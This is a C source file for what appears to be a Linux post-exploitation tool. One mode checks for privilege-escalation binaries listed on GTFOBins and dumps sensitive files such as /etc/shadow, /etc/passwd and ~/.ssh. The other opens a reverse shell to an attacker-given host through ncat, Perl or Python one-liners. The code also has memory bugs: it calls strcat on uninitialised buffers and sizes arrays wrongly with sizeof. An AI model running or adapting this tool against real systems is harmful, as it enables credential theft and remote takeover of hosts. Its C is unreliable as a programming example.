
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define red "\033[38;2;230;0;0m"
#define yellow "\033[38;2;200;200;0m"
#define green "\033[38;2;0;150;0m"
  //TODO: Add bind shells PayloadsAllTheThings
void help(){
  printf("%s\033[1m[Usage]:\033[0m\n\n",yellow);
  printf("%s(Enumerate)\n%s -e\n\n",yellow,__FILE__);
  printf("%s(Reverse Shell)\n%s -rs 127.0.0.1 80\n\n",yellow,__FILE__);
  }
int main(int argc, char *argv[]) {
  //Too few arguments displays help
  if(argc<2){help();}
    //Enumeration with -e arg
 else if(argc > 1 && argc < 3 && strcmp(argv[1],"-e")==0){
  char *packages[] = {"7z","aa-exec","ab","agetty","alpine","ansible-playbook","ansible-test","aoss","apt-get","apt","ar","arp","aria2c","arj","arp","as","ascii-xfr","ascii85","ash","aspell","at","atobm","awk","aws","base32","base58","base64","basenc","baseenc","basez","bash","batcat","bc","bconsole","bpftrace","bridge","bundle","bundler","busctl","busybox","byebug","bzip2","c89","c99","cabal","cancel","capsh","cat","cdist","certbot","check_by_ssh","check_cups","check_log","check_memory","check_raid","check_ssl_cert","check_statusfile","chmod","choom","chown","chroot","clamscan","cmp","cobc","column","comm","composer","cowsay","cowthink","cp","cspan","cpio","cpulimit","crash","crontab","csh","csplit","csvtool","cupsfilter","curl","cut","dash","date","dd","debugfs","dialog","diff","dig","distcc","dmesg","dmidecode","dmsetup","dnf","docker","dos2unix","dosbox","dotnet","dpkg","dstat","dvips","easy_install","eb","ed","efax","elvish","emacs","env","eqn","espeak","ex","exiftool","expand","exspect","facter","file","find","finger","fish","flock","fmt","fold","fping","ftp","gawk","gcc","gcloud","gcore","gdb","gem","genie","genisoimage","ghc","ghci","gimp","ginsh","git","grc","grep","gtester","gzip","hd","head","hexdump","highlight","hping3","iconv","iftop","install","insmod","ionice","ip","irb","ispell","jjs","joe","join","journalctl","jq","jrunscript","jtag","julia","knife","ksh","ksshell","ksu","kubectl","latex","latexmk","ld.so","ldconfig","less","lftp","ln","loginctl","logsave","look","lp","ltrace","lua","lualatex","luatex","lwp-download","lsmod","lwp-request","mail","make","man","mawk","more","modprobe","mosquitto","mount","msfconsole","msgattrib","msgcat","msgconv","msgfilter","msgmerge","msguniq","mtr","multitime","mv","mysql","nano","nasm","nawk","nc","ncat","ncftp","neofetch","nft","nice","nl","nm","nmap","node","nohup","npm","nroff","nsenter","octave","od","openssl","openvpn","openvt","opkg","pacman","pandoc","paste","pax","pdb","pdflatex","pdftex","perf","perl","perlbug","pexec","pg","php","pic","pico","pidstat","pip","pkexec","pkg","posh","pr","pry","psftp","psql","ptx","puppet","pwsh","python","rake","rc","readelf","red","redcarpet","redis","restic","rev","rlogin","rlwrap","rpm","rpmdb","rpmquery","rpmverify","rsync","rtorrent","ruby","run-mailcap","run-parts","rview","rvim","sash","scanmem","scp","screen","script","scrot","sed","service","setarch","setfacl","setlock","sftp","sg","shuf","slsh","smbclient","snap","socat","socket","soelim","softlimit","sort","split","sqlite3","sqlmap","ss","ssh-agent","ssh-keygen","ssh-keyscan","ssh","sshpass","start-stop-daemon","stdbuf","strace","strings","su","sudo","sysctl","systemctl","systemd-resolve","tac","tail","tar","task","taskset","tbl","tclsh","tcpdump","tdbtool","tee","telnet","terraform","tex","tftp","tic","time","timedatectl","timeout","tmate","tmux","top","torify","torsocks","troff","tshark","ul","unexpand","uniq","unshare","unsquashfs","unzip","update-alernatives","uudecode","uuencode","vagrant","valgrind","vi","view","vigr","vim","vlc","vimdiff","vipw","wirsh","volaility","w3m","wall","watch","wc","wget","whiptail","wireshark","wish","whois","xargs","xdg-user-dir","xdotool","xelatex","xetex","xmodmap","xmore","xpad","xxd","xz","yarn","yash","yelp","yum","zathura","zip","zsh","zsoelim","zypper"};
    printf("\033[1m[Potential LOLBINS]\033[0m\033[38;2;250;250;0m Details:gtfobins.github.io\033[0m\n\n");
    char *pkg[sizeof(packages)];
   //For loop of each item in packages array
    for (int c=0; c<sizeof(packages)/sizeof(packages[0]);++c) {
      strcat((char*)pkg, "type ");strcat((char*)pkg, packages[c]);
      strcat((char*)pkg, " 1>/dev/null 2>/dev/null ");
      if (system((char*)pkg) == 0){printf("%s [-] %s is installed\033[0m\n", green, packages[c]);}*pkg = NULL;}//The setting to null prevents concatenation of all strings
   //Commands executed for enumerations
  char *cmd[] = {"id","for i in $(cut -d':' -f1 /etc/passwd);do id $i;done","cat /etc/passwd","cat /etc/master.passwd","cat /etc/shadow","cat /etc/group","cat /etc/profile","cat ~/.ssh/","cat /var/log","cat /var/spool/cron","lastlog","grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0 { print $1}'","sestatus","cat /etc/shells"};
   char *exec[sizeof(cmd)];
   for (int c=0; c<sizeof(cmd)/sizeof(cmd[0]);++c) {
   strcat((char*)exec, cmd[c]);
  if(system(strcat((char*)exec," 2>/dev/null 1>/dev/null"))==0){switch (c) {
    case 0:printf("%s\n[Current ID]\033[0m\n", green);break;
    case 1:printf("%s\n[All IDs and Groups]:\033[0m\n",green);break;
    case 2:printf("%s\n[Passwd File Contents]:\033[0m\n",green);break;
    case 3:printf("%s\n[Master.Passwd File Contents]:\033[0m\n",green);break;
    case 4:printf("%s\n[Shadow File Contents]:\033[0m\n",green);break;
    case 5:printf("%s\n[Group File Contents]:\033[0m\n",green);break;
    case 6:printf("%s\n[Profile File Contents]:\033[0m\n",green);break;
    case 7:printf("%s\n[.ssh File Contents]:\033[0m\n",green);break;
    case 8:printf("%s\n[Log File Contents]:\033[0m\n",green);break;
    case 9:printf("%s\n[Cron Jobs]:\033[0m\n",green);break;
    case 10:printf("%s\n[Last Login]:\033[0m\n",green);break;
    case 11:printf("%s\n[Root Accounts]:\033[0m\n",green);break;
    case 12:printf("%s\n[selinux Status]:\033[0m\n",green);break;
    case 13:printf("%s\n[Available shells]:\033[0m\n",green);break;
    default:printf("%s\n[No Title Available]:\033[0m\n",green);break;
  }*exec = NULL;strcat((char*)exec, cmd[c]);system(strcat((char*)exec," 2>/dev/null"));} 
  else{switch (c){
    case 0:printf("%s\n[Current ID]\033[0m\n", red);break;
    case 1:printf("%s\n[All IDs and Groups]:\033[0m\n",red);break;
    case 2:printf("%s\n[Passwd File Contents]:\033[0m\n",red);break;
    case 3:printf("%s\n[Master.Passwd File Contents]:\033[0m\n",red);break;
    case 4:printf("%s\n[Shadow File Contents]:\033[0m\n",red);break;
    case 5:printf("%s\n[Group File Contents]:\033[0m\n",red);break;
    case 6:printf("%s\n[Profile File Contents]:\033[0m\n",red);break;
    case 7:printf("%s\n[.ssh File Contents]:\033[0m\n",red);break;
    case 8:printf("%s\n[Log File Contents]:\033[0m\n",red);break;
    case 9:printf("%s\n[Cron Jobs]:\033[0m\n",red);break;
    case 10:printf("%s\n[Last Login]:\033[0m\n",red);break;
    case 11:printf("%s\n[Root Accounts]:\033[0m\n",red);break;
    case 12:printf("%s\n[selinux Status]:\033[0m\n",red);break;
    case 13:printf("%s\n[Available shells]:\033[0m\n",red);break;
    default:printf("%s\n[No Title Available]:\033[0m\n",red);break;
  }}*exec = NULL;}}
  else if(argc > 3 && argc < 5 && strcmp(argv[1],"-rs")==0){
    if(system("type ncat 2>/dev/null 1>/dev/null")==0){
     char *rs[sizeof(argv[2])+sizeof(argv[3])+strlen("  ")];
      //Netcat reverse shell
      strcat((char*)rs,"ncat ");strcat((char*)rs,argv[2]);strcat((char*)rs," ");strcat((char*)rs,argv[3]);
      system(strcat((char*)rs," -e /bin/sh 2>/dev/null"));}
      //Perl reverse shell
    else if (system("type perl 2>/dev/null 1>/dev/null")==0){
      char *rs[strlen("perl -e 'use Socket;$i=\"\";$p=\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'")+sizeof(argv[2])+sizeof(argv[3])];
      strcat((char*)rs,"perl -e 'use Socket;$i=\"");
      strcat((char*)rs,argv[2]);strcat((char*)rs,"\";$p=");strcat((char*)rs,argv[3]);
strcat((char*)rs,";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' ");
      system((char*)rs);}
    //Python resverse shell
    else if (system("type python 2>/dev/null 1>/dev/null")==0){
      char *rs[strlen("python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();")+strlen("s.connect((\"\",));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])' 2>/dev/null")+sizeof(argv[2])+sizeof(argv[3])];
      strcat((char*)rs,"python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"");
      strcat((char*)rs,argv[2]);strcat((char*)rs,"\",");strcat((char*)rs,argv[3]);
      strcat((char*)rs,"));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])' 2>/dev/null");
      system((char*)rs);
    }
  }
   //Invalid arguments and errors stuff list usage
  else {help();}
  return 0;
}
